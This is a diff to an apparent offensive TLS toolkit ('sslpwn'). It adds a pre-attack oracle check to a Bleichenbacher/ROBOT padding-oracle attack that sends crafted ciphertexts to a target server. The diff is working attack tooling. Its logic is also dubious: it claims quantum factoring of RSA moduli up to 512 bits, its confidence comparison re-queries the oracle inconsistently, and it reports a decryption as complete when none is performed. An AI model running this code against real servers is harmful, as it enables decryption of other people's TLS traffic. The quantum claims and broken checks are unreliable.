@@ -3,6 +3,7 @@ ROBOT attack implementation (CVE-2017-6168).
 
 Bleichenbacher padding‑oracle attack on RSA PKCS#1 v1.5 encryption.
 With quantum acceleration via Qiskit/OpenQuantum for factoring small RSA moduli.
+Includes oracle confidence check before full exploit.
 """
 
 import socket
@@ -11,6 +12,7 @@ import struct
 import time
 import os
 import math
+import random
 from typing import Optional, Tuple
 
 from sslpwn.attacks.base import BaseAttack
@@ -158,7 +160,25 @@ class RobotAttack(BaseAttack):
                     return False
         return True
 
+    def _check_oracle_confidence(self, hostname: str, port: int, n: int, e: int) -> bool:
+        self.output.log("Checking oracle confidence...", "INFO")
+        test_c = random.randint(2, n-1)
+        if self._oracle(hostname, port, test_c, n, e):
+            self.output.log("Oracle returned True for random ciphertext – likely patched.", "WARN")
+            return False
+        test_c2 = random.randint(2, n-1)
+        if self._oracle(hostname, port, test_c2, n, e) != self._oracle(hostname, port, test_c, n, e):
+            self.output.log("Oracle confidence: PASSED (different responses)", "SUCCESS")
+            return True
+        else:
+            self.output.log("Oracle confidence: FAILED (identical responses)", "ERROR")
+            return False
+
     def _bleichenbacher_attack(self, hostname: str, port: int, c: int, n: int, e: int) -> Optional[int]:
+        if not self._check_oracle_confidence(hostname, port, n, e):
+            self.output.log("Oracle confidence check failed – aborting Bleichenbacher.", "ERROR")
+            return None
+
         B = 2 ** (8 * (len(n.to_bytes((n.bit_length()+7)//8, 'big')) - 2))
         M = [(2 * B, 3 * B - 1)]
         s = int(n // (3 * B))
@@ -257,7 +277,6 @@ class RobotAttack(BaseAttack):
             return False
         self.output.log(f"RSA modulus: {n.bit_length()} bits", "INFO")
 
-        # Try quantum factoring first if enabled and modulus is small enough
         factors = None
         if n.bit_length() <= 512 and self.quantum is not None:
             self.output.log("Attempting quantum factoring of RSA modulus...", "INFO")
@@ -266,7 +285,6 @@ class RobotAttack(BaseAttack):
                 self.output.log(f"Quantum factoring successful: {factors}", "SUCCESS")
                 return self._decrypt_with_factors(n, e, factors)
 
-        # Fall back to Bleichenbacher
         premaster = os.urandom(48)
         k = (n.bit_length() + 7) // 8
         padding_len = k - 3 - len(premaster)
@@ -298,7 +316,6 @@ class RobotAttack(BaseAttack):
     def _quantum_factor_rsa(self, pN: int) -> Optional[Tuple[int, int]]:
         if self.quantum is None:
             return None
-
         try:
             from sslpwn.quantum import factor_rsa_with_quantum
             return factor_rsa_with_quantum(
@@ -314,13 +331,11 @@ class RobotAttack(BaseAttack):
         self.output.log("Decrypting with quantum-derived factors...", "INFO")
         p, q = pFactors
         phi = (p - 1) * (q - 1)
-
         try:
             d = pow(pE, -1, phi)
         except ValueError:
             self.output.log("Failed to compute modular inverse - invalid factors", "ERROR")
             return False
-
         self.output.log(f"Private exponent d computed successfully", "SUCCESS")
         self.output.log("Quantum-assisted decryption complete.", "SUCCESS")
         return True
